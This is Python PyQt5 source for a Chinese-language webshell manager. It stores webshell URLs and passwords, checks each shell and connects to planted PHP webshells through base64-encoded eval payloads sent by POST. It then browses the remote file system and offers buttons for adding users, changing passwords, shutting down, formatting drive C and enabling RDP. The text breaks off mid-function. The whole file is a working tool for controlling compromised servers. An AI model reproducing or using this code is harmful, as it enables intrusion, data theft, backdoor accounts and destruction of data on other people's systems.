import sys,base64,os,webbrowser,urllib.request,urllib.parse,socket
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
import csv,re
from PyQt5.QtGui import *
from GUI.maingui import Ui_MainWindow
from GUI.addshell import Ui_Form
from GUI.useradd import Ui_adduserForm
from GUI.sqlpeizhi import Ui_sql_peizhi

from GUI.changepassword import Ui_changepassword
from GUI.filerename  import Ui_renameForm
import win32con
import win32clipboard as wincld

from common.readqssfile import Common
class MainWindows(QtWidgets.QMainWindow,Ui_MainWindow): #主窗口
    def __init__(self,parent=None):
        super(MainWindows,self).__init__(parent)
        #self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint) #去掉标题栏
        self.Ui = Ui_MainWindow()
        self.Ui.setupUi(self)
        self.setWindowIcon(QtGui.QIcon('./img/main.png'))
        self.setFixedSize(self.width(), self.height()) #设置宽高不可变
        self.Ui.exit.clicked.connect(QtCore.QCoreApplication.instance().quit)  #退出
        self.timer = QTimer()  #设定一个定时器用来显示时间
        self.timer.timeout.connect(self.showtime)
        self.timer.start()

        self.readshellfile()  #加载文件到tableweight
        self.Ui.treeWidget.doubleClicked.connect(self.displayfile) #treeweight双击
        self.Ui.treeWidget_2.doubleClicked.connect(self.intodisplay)  # treeweight_2双击
        self.Ui.savejiaoben.clicked.connect(self.SaveJiaoben)  #保存脚本
        self.Ui.clearjiaoben.clicked.connect(self.ClearJiaoben) #清空脚本
        self.Ui.zairujiaoben.clicked.connect(self.ZairuJiaoben)  # 载入脚本
        self.Ui.gojiaoben.clicked.connect(self.ZhixingJiaoben)  # 执行脚本
        self.Ui.sql_peizhi.clicked.connect(self.Sql_peizhi_show)  # sql配置按钮
        self.Ui.sql_zhixing.clicked.connect(self.Sql_ok)  # sql语句执行


        self.Ui.user.clicked.connect(self.User)  #查询用户
        self.Ui.adduser.clicked.connect(self.useraddshow)#添加用户按钮
        self.Ui.passwd.clicked.connect(self.changepasswdshow)  # 修改密码
        self.Ui.shutdown.clicked.connect(self.Shutdown)  #强制关机
        self.Ui.format.clicked.connect(self.Format)  #格式化C盘
        self.Ui.open3389.clicked.connect(self.Open3389)  # 开启3389
        self.Ui.chinese.clicked.connect(self.Chinese) #中文检测
        self.Ui.update.clicked.connect(self.Update)  #检查更新
        self.Ui.loveme.clicked.connect(self.Loveme)  #联系作者

        self.Ui.textEdit.installEventFilter(self)  # textedit 事件过滤器，enter执行命令

        #文件操作右键菜单
        self.Ui.treeWidget_2.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        self.Ui.treeWidget_2.customContextMenuRequested['QPoint'].connect(self.fileContextMenu)
        #shell管理右键菜单
        self.Ui.tableWidget.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        self.Ui.tableWidget.customContextMenuRequested['QPoint'].connect(self.createContextMenu)
        #历史命令右键菜单
        self.Ui.history.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        self.Ui.history.customContextMenuRequested['QPoint'].connect(self.createhistoryMenu)
        #虚拟终端右键菜单
        self.Ui.textEdit.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        self.Ui.textEdit.customContextMenuRequested['QPoint'].connect(self.createtextEditMenu)

        #设置表格属性  列宽度
        self.Ui.tableWidget.setColumnWidth(0, 335)
        self.Ui.tableWidget.setColumnWidth(1, 60)
        self.Ui.tableWidget.setColumnWidth(2, 50)
        self.Ui.tableWidget.setColumnWidth(3, 140)
        self.Ui.tableWidget.setColumnWidth(4, 45)
        self.Ui.tableWidget.setColumnWidth(5, 139)
        #设置树形控件  列宽度
        self.Ui.treeWidget_2.setColumnWidth(0, 220)
        self.Ui.treeWidget_2.setColumnWidth(1, 180)
        self.Ui.treeWidget_2.setColumnWidth(2, 60)
        self.Ui.treeWidget_2.setColumnWidth(3, 60)

  #初始化读取shell文件
    def readshellfile(self):  #读取shell文件
        try:
            with open('shell.csv') as f:
                reader = csv.reader(f)
                for each in reader:
                    row = self.Ui.tableWidget.rowCount()  # 获取行数
                    self.Ui.tableWidget.setRowCount(row + 1)
                    urlItem = QTableWidgetItem(each[0])
                    passwsItem = QTableWidgetItem(each[1])
                    typeItem = QTableWidgetItem(each[2])
                    ipItem = QTableWidgetItem(each[3])
                    zhuangtaiItem = QTableWidgetItem(each[4])
                    timeItem = QTableWidgetItem(each[5])
                    self.Ui.tableWidget.setItem(row, 0, urlItem)
                    self.Ui.tableWidget.setItem(row, 1, passwsItem)
                    self.Ui.tableWidget.setItem(row, 2, typeItem)
                    self.Ui.tableWidget.setItem(row, 3, ipItem)
                    self.Ui.tableWidget.setItem(row, 4, zhuangtaiItem)
                    self.Ui.tableWidget.setItem(row, 5, timeItem)
                f.close()  # 关闭文件
        except:
            pass
    def showtime(self):  #显示时间
        datetime = QDateTime.currentDateTime()
        text = datetime.toString("yyyy-MM-dd hh:mm:ss")
        self.Ui.timelabel.setText(text)

## shell管理的右键菜单
    def createContextMenu(self):
        '''''
        创建右键菜单
        '''
        # 必须将ContextMenuPolicy设置为Qt.CustomContextMenu
        # 否则无法使用customContextMenuRequested信号

        self.Ui.tableWidget.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        self.Ui.tableWidget.customContextMenuRequested.connect(self.showContextMenu)

        # 创建QMenu
        self.contextMenu = QtWidgets.QMenu(self)
        self.connect_shell_button = self.contextMenu.addAction(u'连接')
        self.add_shell_button = self.contextMenu.addAction(u'添加')
        self.modify_shell_button = self.contextMenu.addAction(u'编辑')
        self.second = self.contextMenu.addMenu(u'复制')
        self.ip_copy_button = self.second.addAction(u'IP')
        self.url_copy_button = self.second.addAction(u'URL')
        self.passwd_copy_button = self.second.addAction(u'密码')
        self.type_copy_button = self.second.addAction(u'类型')
        self.time_copy_button = self.second.addAction(u'时间')
        self.all_copy_button = self.second.addAction(u'全部')
        self.delete_shell_button = self.contextMenu.addAction(u'删除')
        self.delete_all_shell_button = self.contextMenu.addAction(u'清空')
        self.check_shell_button = self.contextMenu.addAction(u'检查')

        # 将动作与处理函数相关联
        # 这里为了简单，将所有action与同一个处理函数相关联，
        # 当然也可以将他们分别与不同函数关联，实现不同的功能
        self.connect_shell_button.triggered.connect(self.Connect_shell)
        self.add_shell_button.triggered.connect(self.Add_shell_show)
        self.modify_shell_button.triggered.connect(self.Modify_shell)
        self.delete_shell_button.triggered.connect(self.Delete_shell)
        self.delete_all_shell_button.triggered.connect(self.Delete_all_shell)
        self.check_shell_button.triggered.connect(self.Check_shell_button)

        #二级菜单
        self.ip_copy_button.triggered.connect(lambda:self.shell_copy('ip'))
        self.url_copy_button.triggered.connect(lambda:self.shell_copy('url'))
        self.passwd_copy_button.triggered.connect(lambda:self.shell_copy('passwd'))
        self.type_copy_button.triggered.connect(lambda:self.shell_copy('type'))
        self.time_copy_button.triggered.connect(lambda:self.shell_copy('time'))
        self.all_copy_button.triggered.connect(lambda:self.shell_copy('all'))
## 文件管理的右键菜单
    def fileContextMenu(self):
        '''''
        创建右键菜单
        '''
        # 必须将ContextMenuPolicy设置为Qt.CustomContextMenu
        # 否则无法使用customContextMenuRequested信号
        self.Ui.treeWidget_2.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        self.Ui.treeWidget_2.customContextMenuRequested.connect(self.showContextMenu)

        # 创建QMenu
        self.contextMenu = QtWidgets.QMenu(self)
        self.file_update = self.contextMenu.addAction(u'更新')
        self.file_upload = self.contextMenu.addAction(u'上传')
        self.file_download = self.contextMenu.addAction(u'下载')
        self.file_delete = self.contextMenu.addAction(u'删除')
        self.file_rename =self.contextMenu.addAction(u'重命名')

        #将动作与处理函数相关联
        #这里为了简单，将所有action与同一个处理函数相关联，
        #当然也可以将他们分别与不同函数关联，实现不同的功能
        self.file_update.triggered.connect(self.File_update)
        self.file_upload.triggered.connect(self.File_upload)
        self.file_download.triggered.connect(self.File_download)
        self.file_delete.triggered.connect(self.File_delete)
        self.file_rename.triggered.connect(self.renameshow)
#### 虚拟终端的右键菜单
    def createtextEditMenu(self):
        '''''
        创建右键菜单
        '''
        # 必须将ContextMenuPolicy设置为Qt.CustomContextMenu
        # 否则无法使用customContextMenuRequested信号
        self.Ui.textEdit.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        self.Ui.textEdit.customContextMenuRequested.connect(self.showContextMenu)

        # 创建QMenu
        self.contextMenu = QtWidgets.QMenu(self)
        self.copy_textEdit = self.contextMenu.addAction(u'复制')
        self.paste_textEdit = self.contextMenu.addAction(u'粘贴')
        self.clear_textEdit = self.contextMenu.addAction(u'清空')

        # 将动作与处理函数相关联
        # 这里为了简单，将所有action与同一个处理函数相关联，
        # 当然也可以将他们分别与不同函数关联，实现不同的功能
        self.copy_textEdit.triggered.connect(self.Copy_textEdit)
        self.paste_textEdit.triggered.connect(self.Paste_textEdit)
        self.clear_textEdit.triggered.connect(self.Clear_textEdit)


## 历史命令的右键菜单
    def createhistoryMenu(self):
        '''''
        创建右键菜单
        '''
        # 必须将ContextMenuPolicy设置为Qt.CustomContextMenu
        # 否则无法使用customContextMenuRequested信号
        self.Ui.history.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        self.Ui.history.customContextMenuRequested.connect(self.showContextMenu)

        # 创建QMenu
        self.contextMenu = QtWidgets.QMenu(self)
        self.copy_history = self.contextMenu.addAction(u'复制')
        self.daochu_history = self.contextMenu.addAction(u'导出')
        self.delete_history = self.contextMenu.addAction(u'删除')
        self.clear_history = self.contextMenu.addAction(u'清空')

        # 将动作与处理函数相关联
        # 这里为了简单，将所有action与同一个处理函数相关联，
        # 当然也可以将他们分别与不同函数关联，实现不同的功能
        self.copy_history.triggered.connect(self.Copy_history)
        self.daochu_history.triggered.connect(self.Daochu_history)
        self.delete_history.triggered.connect(self.Delete_history)
        self.clear_history.triggered.connect(self.Clear_history)

    # 右键点击时调用的函数，移动鼠标位置
    def showContextMenu(self, pos):
        # 菜单显示前，将它移动到鼠标点击的位置
        self.contextMenu.move(QtGui.QCursor.pos())
        self.contextMenu.show()
###虚拟终端右键菜单执行函数
    #复制
    def Copy_textEdit(self):
        data = self.Ui.textEdit.textCursor().selectedText()
        # 访问剪切板，存入值
        wincld.OpenClipboard()
        wincld.EmptyClipboard()
        wincld.SetClipboardData(win32con.CF_UNICODETEXT, data)
        wincld.CloseClipboard()
    #粘贴
    def Paste_textEdit(self):
        wincld.OpenClipboard()
        text = wincld.GetClipboardData(win32con.CF_UNICODETEXT)
        wincld.CloseClipboard()
        self.Ui.textEdit.insertPlainText(text)  #插入文本不换行

    #清空
    def Clear_textEdit(self):
        self.Ui.textEdit.clear()
        self.Virtualshell()

###历史命令右键菜单执行函数
    #复制
    def Copy_history(self):
        data = self.Ui.history.currentItem().text()  #获取当前选中的数据
        #print(data)
        #访问剪切板，存入值
        wincld.OpenClipboard()
        wincld.EmptyClipboard()
        wincld.SetClipboardData(win32con.CF_UNICODETEXT, data)
        wincld.CloseClipboard()
    #导出
    def Daochu_history(self):
        filepath = self.filesave('历史命令.txt')
        #print(filename)
        num = self.Ui.history.count()  # 获取listweight行数
        # print(num)
        try:
            f = open(filepath, "w", encoding='utf-8')  # 打开文件
            for i in range(1, num):
                data = self.Ui.history.item(i).text()  # 获取i行的数据
                # print(data)
                f.write(data + "\n")  # 写入文件
            f.close()  # 关闭文件
        except:
            pass
    #删除
    def Delete_history(self):
        shell = self.Ui.history.currentRow()  # 获取选择项的行号
        self.Ui.history.takeItem(shell)
        # 获取当前选中的行号
    #清空
    def Clear_history(self):
        self.Ui.history.clear()
        self.Ui.history.addItem('历史命令')

##shell复制二级菜单
    def shell_copy(self,type):
        data = self.getshell()
        if type =='ip':
            zhi = data[3]
        if type =='url':
            zhi = data[0]
        if type =='passwd':
            zhi = data[1]
        if type =='type':
            zhi = data[2]
        if type =='time':
            zhi = data[5]
        if type =='all':
            zhi = ''
            for i in data:
                zhi=zhi+'  '+i
        #print(zhi)
        wincld.OpenClipboard()
        wincld.EmptyClipboard()
        wincld.SetClipboardData(win32con.CF_UNICODETEXT, zhi)
        wincld.CloseClipboard()
    #得到shell
    def getshell(self):
        shell = []
        row = self.Ui.tableWidget.currentRow()  # 获取当前选中行的行号

        for i in range(0, self.Ui.tableWidget.columnCount()):
            shell.append(self.Ui.tableWidget.item(row, i).text())  # 获取选中行的文本
        return shell
    # 调用子窗口显示
    def Add_shell_show(self):
        self.WChild = Ui_Form()
        self.dialog = QtWidgets.QDialog(self)
        self.WChild.setupUi(self.dialog)
        self.dialog.show()
        sender = self.sender()

        if sender.text() == "添加":
            self.WChild.pushButton.clicked.connect(self.GetLine)  # 子窗体确定添加shell
        elif sender.text() == "编辑":
            self.WChild.pushButton.clicked.connect(self.editLine)  # 子窗体确定编辑shell

    #添加用户窗口
    def useraddshow(self):
        shell = self.Ui.shelllabel.text()  # 获取shell
        if shell != "":
            self.adduser = Ui_adduserForm()
            self.dialog = QtWidgets.QDialog(self)
            self.adduser.setupUi(self.dialog)
            self.dialog.show()
            self.adduser.userButton.clicked.connect(self.Adduser)
        else:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "请先连接shell！")
    #修改密码子窗口
    def changepasswdshow(self):
        shell = self.Ui.shelllabel.text()  # 获取shell
        if shell != "":
            self.changepasswd = Ui_changepassword()
            self.dialog = QtWidgets.QDialog(self)
            self.changepasswd.setupUi(self.dialog)
            user = self.User(num=2) #返回用户列表
            for i in user:
                self.changepasswd.listWidget.addItem(i) #添加用户到子窗口
            self.dialog.show()
            self.changepasswd.changeuserButton.clicked.connect(self.Changepasswd)
        else:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "请先连接shell！")

    #连接
    def Connect_shell(self):
        #shell = self.Ui.listWidget.currentRow() #获取选择项的行号
        try:
            shell = self.getshell()
            #print(shell[2])
            if shell[2]=="PHP":
                phpcode = "echo(hello);"
                phpcode = base64.b64encode(phpcode.encode('GB2312'))
                data = {shell[1]: '@eval(base64_decode($_POST[z0]));',
                        'z0': phpcode}

                self.Ui.PHP.setChecked(True)  #设置php为选中状态
            # if shell[2]=="ASP":
            #     phpcode="response.write('hello')"
            #     phpcode=base64.b64encode(phpcode.encode('GB2312'))
            #     print(phpcode)
            #     data = {shell[1]: '@eval(<script language="javascript">var a=window.atob("request z0");document.write(a)</script>);',
            #             'z0': phpcode}
                #print(data)
            #print(phpcode)

            #print(data)
            #print(shell[1])
            returndata =self.sendPOST(shell,data).decode('utf-8')
            if returndata == "hello":
                #print(returndata)
                box = QtWidgets.QMessageBox()
                #self.statusBar().showMessage(shell )  # 状态栏显示信息
                box.information(self, "提示", "连接成功！")
                self.Ui.shelllabel.setText(shell[0]+'     '+shell[1]+'     '+shell[2])
                try:
                    self.File_update()  #显示目录
                except:
                    box = QtWidgets.QMessageBox()
                    box.information(self, "提示", "文件管理初始化失败！")
                try:
                    self.Virtualshell()
                except:
                    box = QtWidgets.QMessageBox()
                    box.information(self, "提示", "虚拟终端初始化失败！")

            else:
                box = QtWidgets.QMessageBox()
                box.information(self, "提示", "连接失败！")
        except:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "连接失败！")

    #判断当前系统类型
    def systemtype(self):
        phpcode= "echo PHP_OS;"
        result=self.sendcode(phpcode).decode('utf-8')
        return result


    #添加shell
    def GetLine(self):  # 添加shell给listweiget传值
        url = self.WChild.lineEdit.text()  #获取添加shell窗口的url
        passwd = self.WChild.lineEdit_2.text()  #获取添加shell窗口的密码
        type = self.WChild.comboBox.currentText()   #获取添加shell窗口的类型
        ip = self.getIP(url)
        # print(ip)
        time = self.Ui.timelabel.text()  #获取当前时间
        if(url == "" or passwd ==""):   #判断地址或者密码是不是空
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "地址或密码不能为空！")
        else:
            shell = []
            shell.append(url)
            # print(shell)
            phpcode = "echo(hello);"
            phpcode = base64.b64encode(phpcode.encode('GB2312'))
            data = {passwd: '@eval(base64_decode($_POST[z0]));',
                        'z0': phpcode}
            # print(data)
            try:
                returndata =self.sendPOST(shell,data).decode('utf-8')
                # print(returndata)
            except:
                returndata = ''
            # print(returndata)
            if returndata=='hello':
                zhuangtai ='1'
            else:
                zhuangtai ='-1'
            row = self.Ui.tableWidget.rowCount()  #获取行数
            self.Ui.tableWidget.setRowCount(row+1)
            urlItem = QTableWidgetItem(url)
            passwsItem = QTableWidgetItem(passwd)
            typeItem =  QTableWidgetItem(type)
            ipItem = QTableWidgetItem(ip)
            zhuangtaiItem = QTableWidgetItem(zhuangtai)
            timeItem = QTableWidgetItem(time)
            self.Ui.tableWidget.setItem(row, 0, urlItem)
            self.Ui.tableWidget.setItem(row, 1, passwsItem)
            self.Ui.tableWidget.setItem(row,2,typeItem)
            self.Ui.tableWidget.setItem(row, 3, ipItem)
            self.Ui.tableWidget.setItem(row, 4, zhuangtaiItem)
            self.Ui.tableWidget.setItem(row, 5, timeItem)
            self.dialog.close()
    #域名解析IP
    def getIP(self,url):
        try:
            yuming = url.split('//')
            yuming = yuming[1].split('/')
            first =  yuming[0].split('.')
            #print(first[0])
            if first[0] == '10' or first[0] == '192' or first[0] == '172' or first[0] == '127' or first[0] == '0' or first[0] == '255':
                return yuming[0]
            if re.findall(r'\d+\.\d+\.\d+\.\d+', url):
                return yuming[0]
            else:
                ip = socket.gethostbyname(yuming[0])  # 获取远程主机的IP地址
                return ip
        except:
            ip = '暂无'
            return ip

    #编辑shell  得到值赋值给子框
    def Modify_shell(self):
       shell=[]
       try:
            row = self.Ui.tableWidget.currentRow()  #获取当前选中行的行号

            for i in range(0,self.Ui.tableWidget.columnCount()):
                shell.append(self.Ui.tableWidget.item(row, i).text())#获取选中行的文本

            self.Add_shell_show()    #显示子窗口
            self.WChild.lineEdit.setText(shell[0])   #给子窗口赋值
            self.WChild.lineEdit_2.setText(shell[1])
            self.WChild.pushButton.setText("编辑")

       except:
            box = QtWidgets.QMessageBox()
            box.warning(self, "提示", "请选择一项！")

    #赋值确定按钮
    def editLine(self):
        url = self.WChild.lineEdit.text()  #获取子窗口的值
        passwd = self.WChild.lineEdit_2.text()
        type = self.WChild.comboBox.currentText()  # 获取添加shell窗口的类型
        ip = self.getIP(url)
        #print(ip)
        time = self.Ui.timelabel.text()  # 获取当前时间
        row = self.Ui.tableWidget.currentRow()  # 获取当前选中行的行号
        #检测状态
        shell = []
        shell.append(url)
        # print(shell)
        phpcode = "echo(hello);"
        phpcode = base64.b64encode(phpcode.encode('GB2312'))
        data = {passwd: '@eval(base64_decode($_POST[z0]));',
                'z0': phpcode}
        try:
            returndata = self.sendPOST(shell, data).decode('utf-8')
        except:
            returndata=''
        # print(returndata)
        if returndata == 'hello':
            zhuangtai = '1'
        else:
            zhuangtai = '-1'
        #添加数据
        urlItem = QTableWidgetItem(url)
        passwsItem = QTableWidgetItem(passwd)
        typeItem = QTableWidgetItem(type)
        ipItem = QTableWidgetItem(ip)
        zhuangtaiItem = QTableWidgetItem(zhuangtai)
        timeItem = QTableWidgetItem(time)
        self.Ui.tableWidget.setItem(row, 0, urlItem)
        self.Ui.tableWidget.setItem(row, 1, passwsItem)
        self.Ui.tableWidget.setItem(row, 2, typeItem)
        self.Ui.tableWidget.setItem(row, 3, ipItem)
        self.Ui.tableWidget.setItem(row, 4, zhuangtaiItem)
        self.Ui.tableWidget.setItem(row, 5, timeItem)
        self.dialog.close()   #关闭子窗口

    #删除选中的shell
    def Delete_shell(self):
        button = QMessageBox.question(self, "警告！",
                                      self.tr("你确定要删除选中的项吗？"),
                                      QMessageBox.Ok | QMessageBox.Cancel,
                                      QMessageBox.Ok)
        if button == QMessageBox.Ok:
            self.Ui.tableWidget.removeRow(self.Ui.tableWidget.currentRow())#删除选中的行
        else:
            return

    #清空所有
    def Delete_all_shell(self):
        button = QMessageBox.question(self, "警告！",
                                      self.tr("你确定要清空所有内容吗？"),
                                      QMessageBox.Ok | QMessageBox.Cancel,
                                      QMessageBox.Ok)
        if button == QMessageBox.Ok:
            for i in range(0, self.Ui.tableWidget.rowCount()):  # 循环行
                self.Ui.tableWidget.removeRow(0)
            #self.Ui.tableWidget.clearContents()  #清空所有内容，不包含标题头
            #self.Ui.tableWidget.clear()   #清空所有内容，包括标题
        else:
            return
    #shell检查
    def Check_shell_button(self):
        shell=[]
        for i in range(0, self.Ui.tableWidget.rowCount()):  # 循环行
            for j in range(0, self.Ui.tableWidget.columnCount()):  # 循环列
                if self.Ui.tableWidget.item(i, j) != None:  # 有数据
                    shell.append(self.Ui.tableWidget.item(i, j).text()) # 空格分隔
            # print(data)
            # print(shell)
            phpcode = "echo(hello);"
            phpcode = base64.b64encode(phpcode.encode('GB2312'))
            data = {shell[1]: '@eval(base64_decode($_POST[z0]));',
                    'z0': phpcode}
            # print(data)
            try:
                returndata = self.sendPOST(shell, data).decode('utf-8')
                # print(returndata)
            except:
                returndata = ''
            # print(returndata)
            if returndata == 'hello':
                zhuangtai = '1'
            else:
                zhuangtai = '-1'
            self.Ui.tableWidget.item(i, 4).setText(zhuangtai)  #设置状态
            shell = []
        box = QtWidgets.QMessageBox()
        box.information(self, "shell检查", "检查完毕！")
###文件操作
    #更新缓存
    def File_update(self):
        shell = self.Ui.shelllabel.text()
        if shell!="":
            #列出目录
            self.Ui.treeWidget.clear() #清空treeweight的所有内容
            self.Ui.treeWidget_2.clear() #清空treeweight_2的所有内容

            #phpcode = '$D="C:";$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M = NULL;$L = NULL;while($N= @readdir($F)){$P =$D."/".$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert( @fileperms($P), 10, 8), -4);$R = "\t".$T."\t". @filesize($P)."\t".$E."  ";if(@ is_dir($P)){$M.=$N."/".$R;}else{$L.=$N.$R;}}echo($M.$L);@closedir($F);};die();'
            system =self.systemtype() #获取系统类型
            if system == "WINNT":
                path=self.getpan()#列出所有盘符
                # path=["C:","D:","E:","F:","G:","H:","I:","J:"]
                path=path[1:]
            if system == "Linux":
                path = self.getCatalog()  #获取远程主机的所有根目录
                #path = ["/bin","/etc","/dev","/lib","/lib64","/opt","/root","/var","/tmp","/usr","/mnt","home"]
                #print(path)
            for i in path:  #循环列出c盘  D盘等
                data=self.listfile(i)   #调用列出目录
                data = data.decode('utf-8',"ignore")
                #print(data)
                # if data =='ERROR:// Path Not Found Or No Permission!':  #判断3个盘是不是存在
                #
                #     box = QtWidgets.QMessageBox()
                # #     box.warning(self, "提示", "部分目录没有权限！")
                # else:  #若存在 列出目录
                listdata = data.split('  ')   # 分割data
                root = QTreeWidgetItem(self.Ui.treeWidget)  #创建对象
                #self.tree = QTreeWidget()
                root.setText(0,i)  #创建主节点

                listdata=listdata[:-1]   #去掉空格
                for i in listdata:  #循环每一个元素

                    singerdata = i.split("\t")   #用\t将名字大小权限修改时间分割
                    #print(singerdata[0])
                    if singerdata[0][-1] =='/' and singerdata[0] != "./" and singerdata[0] != "../":
                        singerdata[0]=singerdata[0][:-1]   #创建c盘下的子节点
                        child1 = QTreeWidgetItem(root)   #子节点位置
                        child1.setText(0, singerdata[0])   #子节点赋值
                    # else:
                    #     child2 = QTreeWidgetItem(child1)  # 创建子子节点
                    #     child2.setText(0, singerdata[0])  # 赋值

            #phpcode = "system('" + "dir" + "');"
        else:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "请先连接shell！")

    # 列出目录
    def listfile(self,path):
        shell = self.Ui.shelllabel.text()  #获取shell
        #print(shell)
        shell = shell.split("     ")
        phpcode = '$D="' + path + '";$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M = NULL;$L = NULL;while($N= @readdir($F)){$P =$D."/".$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert( @fileperms($P), 10, 8), -4);$R = "\t".$T."\t". @filesize($P)."\t".$E."  ";if(@ is_dir($P)){$M.=$N."/".$R;}else{$L.=$N.$R;}}echo($M.$L);@closedir($F);};die();'
        #print(phpcode)
        phpcode = base64.b64encode(phpcode.encode('GB2312'))
        #print(phpcode)
        data = {shell[1]: '@eval(base64_decode($_POST[z0]));',
                'z0': phpcode}
        #print(data)
        return self.sendPOST(shell,data)  #返回数据

  #显示当前对象的路径
    def showfilepath(self,index):
        #filename = self.Ui.treeWidget.currentItem().text(0)  #当前目录或文件名
        if index =="treeWidget":
            index = self.Ui.treeWidget.currentItem()   #当前的Item对象
        if index =="treeWidget_2":
            index = self.Ui.treeWidget_2.currentItem()
        try:
            filepath = index.text(0)
            index2=index.parent().text(0)   #父节点
            filepath = index2+'/'+index.text(0)  #组合
            index3=index.parent().parent().text(0)   #父父节点
            filepath = index3 + '/' + filepath  #组合目录
            index4=index.parent().parent().parent().text(0)   #父父父节点
            filepath = index4 +'/' + filepath  #组合目录
            index5=index.parent().parent().parent().parent().text(0)   #父父父父节点
            filepath = index5 +'/' + filepath  #组合目录
            index6 = index.parent().parent().parent().parent().parent().text(0)  # 父父父父节点
            filepath = index6 + '/' + filepath  # 组合目录
        except:
            pass
        # print(filepath)
        return filepath

    # treeweight鼠标双击显示详细信息
    def displayfile(self):
        try:
            #print(filepath)  #输出当前项的绝对目录
            data=self.listfile(self.showfilepath("treeWidget"))   #调用函数显示数据
            # print(data)
            data = data.decode('utf-8', "ignore")
            #print(data)
            listdata = data.split('  ')   #将文件分开
            # print(listdata)
            listdata = listdata[:-1]  #去掉最后的空
           #print(listdata)
            self.Ui.treeWidget_2.clear()  #清空treeweight_2中的所有数据
            currentItem = self.Ui.treeWidget.currentItem()  # 当前的Item对象
            # :
            if (currentItem.child(0) != None):
                num = currentItem.childCount()  # 获取子节点个数
                for i in range(0,num+3):
                    currentItem.takeChild(0)  #删除当前所有子节点
            # else:
            #     self.Ui.treeWidget.takeTopLevelItem(self.Ui.treeWidget.currentItem.row())
            index = self.Ui.treeWidget.currentItem()  # 当前的Item对象
            for i in listdata:  # 循环每一个元素

                singerdata = i.split("\t")  # 用\t将名字大小权限修改时间分割
                # print(singerdata)
                if singerdata[0][-1] =='/' and singerdata[0] != "./" and singerdata[0] != "../":
                    if singerdata[0][-1] == "/":  #去掉文件夹后面的斜杠
                        singerdata[0] = singerdata[0][:-1]
                    child2 = QTreeWidgetItem(index)  # 创建子子节点p,
                    child2.setText(0, singerdata[0])
                    #将文件详细信息写入到listweight_2
                # print(singerdata[0])
                if singerdata[0] != "./" and singerdata[0] != "../" :#and singerdata[0][-1]!="/":  #文件显示出来,显示文件夹！！！
                    if singerdata[0][-1]=="/":  #去掉文件夹后面的斜杠
                        singerdata[0]=singerdata[0][:-1]
                    try:
                        singerdata[2] = self.Transformation(abs(int(singerdata[2])))  # 尝试单位转换
                    except:
                        pass
                   # print(singerdata)
                    root = QTreeWidgetItem(self.Ui.treeWidget_2)  # 创建对象
                    #显示数据
                    root.setText(0, singerdata[0])
                    root.setText(1, singerdata[1])
                    root.setText(2, singerdata[3])
                    root.setText(3, singerdata[2])
        except:
            pass
    #双击进入目录
    def intodisplay(self):
        try:
            treeWidget_path = self.showfilepath("treeWidget")
            treeWidget_path_2 = self.showfilepath("treeWidget_2")
            index = self.Ui.treeWidget.currentItem()  # 当前的Item对象
            index2text = self.Ui.treeWidget_2.currentItem().text(0)  # 当前的Item对象
            item = QtWidgets.QTreeWidgetItemIterator(self.Ui.treeWidget_2)
            # 该类的value()即为QTreeWidgetItem
            num = 0
            while item.value():
                try:
                    text = item.value().text(0)  #读取值

                    # print(text)
                    if text == index2text:
                        break;
                # if  item.value().checkState(0) != QtCore.Qt.Checked:
                # # 参考网上的方法，判断有无父母结点后再分别操作的那个，实在找不到更直接的
                #     self.deleteNode()
                # # 因为我这里是删除了结点，删除后结点位置发生变化，所以要向后退一步
                #     item = item.__isub__(1)
                # # 到下一个节点
                    item = item.__iadd__(1)
                    num = num + 1
                except:
                    pass
            # print(num)
            try:
                # print(index.text(0))
                item = index.child(num)   #设置子节点为当前对象
                self.Ui.treeWidget.setCurrentItem(item)   #设置选中
            except:
                pass
            # print(index2text)

            if '.' not in index2text :
                #设置选中行
                path = treeWidget_path+'/'+treeWidget_path_2
                # print(path)
                data = self.listfile(path)  # 调用函数显示数据
                data = data.decode('utf-8', "ignore")
                # print(data)
                listdata = data.split('  ')  # 将文件分开
                # print(listdata)
                listdata = listdata[:-1]  # 去掉最后的空
                # print(listdata)
                self.Ui.treeWidget_2.clear()  # 清空treeweight_2中的所有数据
                index = self.Ui.treeWidget.currentItem()
                for i in listdata:  # 循环每一个元素

                    singerdata = i.split("\t")  # 用\t将名字大小权限修改时间分割
                    if singerdata[0][-1] =='/' and singerdata[0] != "./" and singerdata[0] != "../":
                        child2 = QTreeWidgetItem(index)  # 创建子子节点p,
                        child2.setText(0, singerdata[0])
                        # 将文件详细信息写入到listweight_2
                        child2 = QTreeWidgetItem(index)  # 创建子子节点
                        child2.setText(0, singerdata[0][:-1])
                    if singerdata[0] != "./" and singerdata[
                        0] != "../":  # and singerdata[0][-1]!="/":  #文件显示出来,显示文件夹！！！
                        if singerdata[0][-1] == "/":  # 去掉文件夹后面的斜杠
                            singerdata[0] = singerdata[0][:-1]
                        try:
                            singerdata[2] = self.Transformation(abs(int(singerdata[2])))  # 尝试单位转换
                        except:
                            pass
                        # print(singerdata)
                        root = QTreeWidgetItem(self.Ui.treeWidget_2)  # 创建对象
                        # 显示数据
                        root.setText(0, singerdata[0])
                        root.setText(1, singerdata[1])
                        root.setText(2, singerdata[3])
                        root.setText(3, singerdata[2])
        except:
            pass

    #换算文件的大小
    def Transformation(self,size):
        if (size < 1024):
            return str(size) + " B"
        elif 1024 < size < 1048576:
            size = round(size / 1024, 2)
            return str(size) + " KB"
        elif 1048576 < size < 1073741824:
